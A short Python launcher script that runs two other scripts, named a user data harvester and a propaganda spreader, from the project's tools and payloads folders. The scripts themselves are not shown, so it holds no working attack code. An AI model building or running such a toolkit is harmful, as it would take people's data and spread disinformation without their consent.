import subprocess
import os

def main():
    # Run the user data harvester
    user_data_harvester_path = os.path.join(os.path.dirname(__file__), "tools", "user_data_harvester.py")
    subprocess.run(["python3", user_data_harvester_path])

    # Run the propaganda spreader
    propaganda_spreader_path = os.path.join(os.path.dirname(__file__), "payloads", "propaganda_spreader.py")
    subprocess.run(["python3", propaganda_spreader_path])

if __name__ == "__main__":
    main()
